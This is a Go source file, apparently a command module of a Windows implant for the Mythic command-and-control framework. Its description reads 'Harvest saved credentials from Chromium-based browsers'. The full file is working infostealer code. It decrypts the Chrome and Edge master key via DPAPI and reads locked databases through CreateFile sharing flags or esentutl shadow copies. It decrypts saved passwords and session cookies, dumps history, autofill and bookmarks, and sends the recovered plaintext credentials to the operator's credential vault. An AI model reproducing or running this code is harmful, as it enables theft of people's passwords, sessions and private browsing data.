//go:build windows

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	_ "modernc.org/sqlite"

	"golang.org/x/sys/windows"
)

type BrowserCommand struct{}

func (c *BrowserCommand) Name() string {
	return "browser"
}

func (c *BrowserCommand) Description() string {
	return "Harvest saved credentials from Chromium-based browsers (Chrome, Edge)"
}

type browserArgs struct {
	Action  string `json:"action"`  // passwords (default), cookies, history, autofill, bookmarks
	Browser string `json:"browser"` // all (default), chrome, edge
}

type browserCred struct {
	Browser  string
	URL      string
	Username string
	Password string
}

type browserCookie struct {
	Browser  string
	Host     string
	Name     string
	Value    string
	Path     string
	Expires  int64
	Secure   bool
	HTTPOnly bool
}

func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
	var args browserArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = "passwords"
			args.Browser = "all"
		}
	}

	if args.Action == "" {
		args.Action = "passwords"
	}
	if args.Browser == "" {
		args.Browser = "all"
	}

	switch strings.ToLower(args.Action) {
	case "passwords":
		return browserPasswords(args)
	case "cookies":
		return browserCookies(args)
	case "history":
		return browserHistory(args)
	case "autofill":
		return browserAutofill(args)
	case "bookmarks":
		return browserBookmarks(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// browserPaths returns the User Data directories for supported browsers
func browserPaths(browser string) map[string]string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return nil
	}

	all := map[string]string{
		"Chrome": filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		"Edge":   filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
	}

	switch strings.ToLower(browser) {
	case "chrome":
		return map[string]string{"Chrome": all["Chrome"]}
	case "edge":
		return map[string]string{"Edge": all["Edge"]}
	default:
		return all
	}
}

// getEncryptionKey reads and decrypts the browser's AES encryption key
func getEncryptionKey(userDataDir string) ([]byte, error) {
	localStatePath := filepath.Join(userDataDir, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}

	var localState struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("parse Local State: %w", err)
	}

	if localState.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("base64 decode key: %w", err)
	}

	// Strip "DPAPI" prefix (5 bytes)
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected key prefix (not DPAPI)")
	}
	encryptedKey = encryptedKey[5:]

	// Decrypt with DPAPI
	return dpapiDecrypt(encryptedKey)
}

// dpapiDecrypt calls CryptUnprotectData to decrypt DPAPI-protected data
func dpapiDecrypt(data []byte) ([]byte, error) {
	dataIn := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var dataOut windows.DataBlob

	err := windows.CryptUnprotectData(&dataIn, nil, nil, 0, nil, 0, &dataOut)
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}

	// Copy output and free the system-allocated buffer
	result := make([]byte, dataOut.Size)
	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))

	return result, nil
}

// decryptPassword decrypts a Chrome AES-GCM encrypted password
func decryptPassword(encryptedPassword []byte, key []byte) (string, error) {
	if len(encryptedPassword) < 15 {
		return "", fmt.Errorf("encrypted data too short")
	}

	// Check for "v10" or "v11" prefix (AES-GCM encryption)
	prefix := string(encryptedPassword[:3])
	if prefix == "v10" || prefix == "v11" {
		encryptedPassword = encryptedPassword[3:]

		// 12-byte nonce + ciphertext (includes 16-byte GCM tag)
		if len(encryptedPassword) < 12+16 {
			return "", fmt.Errorf("encrypted data too short for AES-GCM")
		}

		nonce := encryptedPassword[:12]
		ciphertext := encryptedPassword[12:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return "", fmt.Errorf("create AES cipher: %w", err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("create GCM: %w", err)
		}

		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "", fmt.Errorf("GCM decrypt: %w", err)
		}

		return string(plaintext), nil
	}

	// Legacy DPAPI-only encryption (no v10/v11 prefix)
	plaintext, err := dpapiDecrypt(encryptedPassword)
	if err != nil {
		return "", fmt.Errorf("DPAPI decrypt: %w", err)
	}
	return string(plaintext), nil
}

// copyFile copies src to dst for safe reading of locked databases.
// First tries CreateFileW with full sharing flags to bypass browser locks.
// Falls back to esentutl /y /vss which uses Volume Shadow Copy for
// exclusively-locked files (Chrome/Edge lock Cookies DB while running).
func copyFile(src, dst string) error {
	srcPtr, err := windows.UTF16PtrFromString(src)
	if err != nil {
		return err
	}
	h, err := windows.CreateFile(
		srcPtr,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err == nil {
		in := os.NewFile(uintptr(h), src)
		defer in.Close()
		out, outErr := os.Create(dst)
		if outErr != nil {
			return outErr
		}
		defer out.Close()
		_, copyErr := io.Copy(out, in)
		return copyErr
	}

	// Fallback: esentutl /y /vss copies via Volume Shadow Copy
	_, vssErr := execCmdTimeout("esentutl", "/y", "/vss", src, "/d", dst)
	if vssErr == nil {
		return nil
	}
	// Return original CreateFile error as it's more descriptive
	return fmt.Errorf("open %s: %w (VSS fallback also failed: %v)", filepath.Base(src), err, vssErr)
}

// findProfiles returns profile directories containing Login Data
func findProfiles(userDataDir string) []string {
	var profiles []string

	// Check Default profile
	defaultLogin := filepath.Join(userDataDir, "Default", "Login Data")
	if _, err := os.Stat(defaultLogin); err == nil {
		profiles = append(profiles, filepath.Join(userDataDir, "Default"))
	}

	// Check numbered profiles (Profile 1, Profile 2, etc.)
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			loginPath := filepath.Join(userDataDir, entry.Name(), "Login Data")
			if _, err := os.Stat(loginPath); err == nil {
				profiles = append(profiles, filepath.Join(userDataDir, entry.Name()))
			}
		}
	}

	return profiles
}

func browserPasswords(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	var allCreds []browserCred
	var errors []string

	for browserName, userDataDir := range paths {
		// Check if browser is installed
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		// Get the encryption key
		key, err := getEncryptionKey(userDataDir)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		// Find all profiles
		profiles := findProfiles(userDataDir)
		if len(profiles) == 0 {
			errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
			continue
		}

		for _, profileDir := range profiles {
			loginDataPath := filepath.Join(profileDir, "Login Data")
			profileName := filepath.Base(profileDir)

			// Strategy 1: Copy DB to temp file, open from copy
			tf, tfErr := os.CreateTemp("", "")
			if tfErr == nil {
				tmpFile := tf.Name()
				tf.Close()
				if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
					creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
					os.Remove(tmpFile)
					if readErr == nil {
						allCreds = append(allCreds, creds...)
						continue
					}
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
					continue
				}
				os.Remove(tmpFile)
			}

			// Strategy 2: Open locked DB directly in immutable mode
			immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
			creds, err := readLoginData(immutableURI, key, browserName, profileName)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}
			allCreds = append(allCreds, creds...)
		}
	}

	// Format output
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Credentials (%d found) ===\n\n", len(allCreds)))

	for _, cred := range allCreds {
		sb.WriteString(fmt.Sprintf("Browser:  %s\n", cred.Browser))
		sb.WriteString(fmt.Sprintf("URL:      %s\n", cred.URL))
		sb.WriteString(fmt.Sprintf("Username: %s\n", cred.Username))
		if cred.Password != "" {
			sb.WriteString(fmt.Sprintf("Password: %s\n", cred.Password))
		} else {
			sb.WriteString("Password: [decryption failed]\n")
		}
		sb.WriteString("\n")
	}

	if len(errors) > 0 {
		sb.WriteString("--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCreds) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no saved credentials.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}

	// Report decrypted passwords to Mythic credential vault
	var mythicCreds []structs.MythicCredential
	for _, cred := range allCreds {
		if cred.Password != "" && cred.Username != "" {
			mythicCreds = append(mythicCreds, structs.MythicCredential{
				CredentialType: "plaintext",
				Realm:          cred.URL,
				Account:        cred.Username,
				Credential:     cred.Password,
				Comment:        fmt.Sprintf("browser (%s)", cred.Browser),
			})
		}
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	return result
}

func readLoginData(dbPath string, key []byte, browserName, profileName string) ([]browserCred, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND length(password_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query logins: %w", err)
	}
	defer rows.Close()

	var creds []browserCred
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		if len(passwordBlob) == 0 {
			continue
		}

		password, err := decryptPassword(passwordBlob, key)
		if err != nil {
			password = ""
		}

		// Skip entries with no username and no password
		if username == "" && password == "" {
			continue
		}

		creds = append(creds, browserCred{
			Browser:  label,
			URL:      url,
			Username: username,
			Password: password,
		})
	}

	return creds, nil
}

// findCookieProfiles returns profile directories containing Cookies or Network/Cookies
func findCookieProfiles(userDataDir string) []string {
	var profiles []string

	checkProfile := func(dir string) {
		// Chrome 96+ stores cookies in Network/Cookies
		networkCookies := filepath.Join(dir, "Network", "Cookies")
		if _, err := os.Stat(networkCookies); err == nil {
			profiles = append(profiles, dir)
			return
		}
		// Older versions store in profile/Cookies
		cookies := filepath.Join(dir, "Cookies")
		if _, err := os.Stat(cookies); err == nil {
			profiles = append(profiles, dir)
		}
	}

	checkProfile(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			checkProfile(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// cookieDBPath returns the path to the Cookies database for a profile
func cookieDBPath(profileDir string) string {
	// Chrome 96+ path
	networkPath := filepath.Join(profileDir, "Network", "Cookies")
	if _, err := os.Stat(networkPath); err == nil {
		return networkPath
	}
	return filepath.Join(profileDir, "Cookies")
}

func browserCookies(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	var allCookies []browserCookie
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		key, err := getEncryptionKey(userDataDir)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
			continue
		}

		profiles := findCookieProfiles(userDataDir)
		if len(profiles) == 0 {
			errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
			continue
		}

		for _, profileDir := range profiles {
			dbPath := cookieDBPath(profileDir)
			profileName := filepath.Base(profileDir)

			// Strategy 1: Copy DB to temp file, open from copy
			tf, tfErr := os.CreateTemp("", "")
			if tfErr == nil {
				tmpFile := tf.Name()
				tf.Close()
				if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
					cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
					os.Remove(tmpFile)
					if readErr == nil {
						allCookies = append(allCookies, cookies...)
						continue
					}
					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
					continue
				}
				os.Remove(tmpFile)
			}

			// Strategy 2: Open locked DB directly in immutable mode (no locking)
			// URI format tells SQLite the file won't change, skipping all locks
			immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
			cookies, err := readCookieData(immutableURI, key, browserName, profileName)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}
			allCookies = append(allCookies, cookies...)
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Cookies (%d found) ===\n\n", len(allCookies)))

	for _, c := range allCookies {
		flags := ""
		if c.Secure {
			flags += " Secure"
		}
		if c.HTTPOnly {
			flags += " HttpOnly"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s  %s=%s  (path=%s%s)\n",
			c.Browser, c.Host, c.Name, truncStr(c.Value, 80), c.Path, flags))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	if len(allCookies) == 0 && len(errors) == 0 {
		sb.WriteString("No Chromium-based browsers found or no cookies.\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func readCookieData(dbPath string, key []byte, browserName, profileName string) ([]browserCookie, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("open database: %w", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0")
	if err != nil {
		return nil, fmt.Errorf("query cookies: %w", err)
	}
	defer rows.Close()

	var cookies []browserCookie
	label := browserName
	if profileName != "Default" {
		label = fmt.Sprintf("%s (%s)", browserName, profileName)
	}

	var total, decryptFails int
	for rows.Next() {
		var host, name, path string
		var encValue []byte
		var expiresUTC int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		if len(encValue) == 0 {
			continue
		}

		total++
		value, err := decryptPassword(encValue, key)
		if err != nil || value == "" {
			decryptFails++
			continue
		}

		cookies = append(cookies, browserCookie{
			Browser:  label,
			Host:     host,
			Name:     name,
			Value:    value,
			Path:     path,
			Expires:  expiresUTC,
			Secure:   isSecure != 0,
			HTTPOnly: isHTTPOnly != 0,
		})
	}

	if decryptFails > 0 && len(cookies) == 0 {
		return cookies, fmt.Errorf("all %d cookies failed to decrypt (Chrome 127+/Edge App-Bound Encryption may be active)", total)
	}

	return cookies, nil
}

// findProfilesWithFile returns profile directories containing the given file (or subpath).
func findProfilesWithFile(userDataDir string, relPath string) []string {
	var profiles []string

	check := func(dir string) {
		if _, err := os.Stat(filepath.Join(dir, relPath)); err == nil {
			profiles = append(profiles, dir)
		}
	}

	check(filepath.Join(userDataDir, "Default"))

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			check(filepath.Join(userDataDir, entry.Name()))
		}
	}

	return profiles
}

// openBrowserDB opens a browser SQLite database using the copy+fallback pattern.
// Returns (db, cleanup func, error). Caller must call cleanup when done.
func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
	// Strategy 1: Copy DB to temp file
	tf, tfErr := os.CreateTemp("", "")
	if tfErr == nil {
		tmpFile := tf.Name()
		tf.Close()
		if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
			db, err := sql.Open("sqlite", tmpFile)
			if err == nil {
				cleanup := func() {
					db.Close()
					os.Remove(tmpFile)
				}
				return db, cleanup, nil
			}
		}
		os.Remove(tmpFile)
	}

	// Strategy 2: Open in immutable mode
	immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
	db, err := sql.Open("sqlite", immutableURI)
	if err != nil {
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
	}
	cleanup := func() { db.Close() }
	return db, cleanup, nil
}

// browserHistory extracts browsing history from Chromium browsers.
func browserHistory(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	type historyEntry struct {
		Browser    string
		URL        string
		Title      string
		VisitCount int
		LastVisit  string
	}

	var allEntries []historyEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "History")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "History")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var url, title string
				var visitCount int
				var lastVisitTime int64

				if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
					continue
				}

				// Chrome timestamps are microseconds since 1601-01-01
				lastVisit := chromeTimeToString(lastVisitTime)

				allEntries = append(allEntries, historyEntry{
					Browser:    label,
					URL:        url,
					Title:      title,
					VisitCount: visitCount,
					LastVisit:  lastVisit,
				})
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser History (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		title := e.Title
		if title == "" {
			title = "(no title)"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s\n  %s  (visits: %d, last: %s)\n",
			e.Browser, truncStr(title, 80), truncStr(e.URL, 120), e.VisitCount, e.LastVisit))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// browserAutofill extracts autofill form data from Chromium browsers.
func browserAutofill(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	type autofillEntry struct {
		Browser      string
		FieldName    string
		Value        string
		Count        int
		DateLastUsed string
	}

	var allEntries []autofillEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Web Data")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, "Web Data")
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query("SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT 500")
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var name, value string
				var count int
				var dateLastUsed int64

				if err := rows.Scan(&name, &value, &count, &dateLastUsed); err != nil {
					continue
				}

				lastUsed := chromeTimeToString(dateLastUsed)

				allEntries = append(allEntries, autofillEntry{
					Browser:      label,
					FieldName:    name,
					Value:        value,
					Count:        count,
					DateLastUsed: lastUsed,
				})
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Autofill (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("[%s] %s = %s  (used: %d times, last: %s)\n",
			e.Browser, e.FieldName, truncStr(e.Value, 60), e.Count, e.DateLastUsed))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// browserBookmarks extracts bookmarks from Chromium browsers.
func browserBookmarks(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return structs.CommandResult{
			Output:    "Could not determine LOCALAPPDATA path",
			Status:    "error",
			Completed: true,
		}
	}

	var allBookmarks []browserBookmarkEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		profiles := findProfilesWithFile(userDataDir, "Bookmarks")
		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			bmPath := filepath.Join(profileDir, "Bookmarks")
			profileName := filepath.Base(profileDir)

			data, err := os.ReadFile(bmPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			var bmFile struct {
				Roots map[string]json.RawMessage `json:"roots"`
			}
			if err := json.Unmarshal(data, &bmFile); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): parse: %v", browserName, profileName, err))
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rootName, raw := range bmFile.Roots {
				// Skip non-object roots (e.g. "sync_transaction_version")
				if len(raw) == 0 || raw[0] != '{' {
					continue
				}
				var node bookmarkNode
				if err := json.Unmarshal(raw, &node); err != nil {
					continue
				}
				extractBookmarks(&node, label, rootName, &allBookmarks)
			}
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Bookmarks (%d found) ===\n\n", len(allBookmarks)))

	for _, b := range allBookmarks {
		sb.WriteString(fmt.Sprintf("[%s] [%s] %s\n  %s\n",
			b.Browser, b.Folder, truncStr(b.Name, 80), truncStr(b.URL, 120)))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

type browserBookmarkEntry struct {
	Browser string
	Name    string
	URL     string
	Folder  string
}

type bookmarkNode struct {
	Type     string         `json:"type"`
	Name     string         `json:"name"`
	URL      string         `json:"url"`
	Children []bookmarkNode `json:"children"`
}

func extractBookmarks(node *bookmarkNode, browser, folder string, out *[]browserBookmarkEntry) {
	if node.Type == "url" && node.URL != "" {
		*out = append(*out, browserBookmarkEntry{
			Browser: browser,
			Name:    node.Name,
			URL:     node.URL,
			Folder:  folder,
		})
	}
	for i := range node.Children {
		childFolder := folder
		if node.Children[i].Type == "folder" {
			childFolder = folder + "/" + node.Children[i].Name
		}
		extractBookmarks(&node.Children[i], browser, childFolder, out)
	}
}

// chromeTimeToString converts a Chrome/Chromium timestamp to a human-readable UTC string.
// Chrome uses two epoch formats:
// - History/cookies: microseconds since 1601-01-01 (very large numbers, >10^16)
// - Autofill: seconds since Unix epoch (smaller numbers, ~10^9)
// This function auto-detects based on magnitude.
func chromeTimeToString(ts int64) string {
	if ts <= 0 {
		return "never"
	}
	// Chrome epoch timestamps are >10^16, Unix epoch seconds are ~10^9
	const chromeToUnixMicros = 11644473600000000
	if ts > 1e13 {
		// Chrome epoch: microseconds since 1601-01-01
		unixMicros := ts - chromeToUnixMicros
		if unixMicros < 0 {
			return "unknown"
		}
		t := time.Unix(unixMicros/1000000, (unixMicros%1000000)*1000)
		return t.UTC().Format("2006-01-02 15:04:05")
	}
	// Unix epoch seconds
	t := time.Unix(ts, 0)
	return t.UTC().Format("2006-01-02 15:04:05")
}
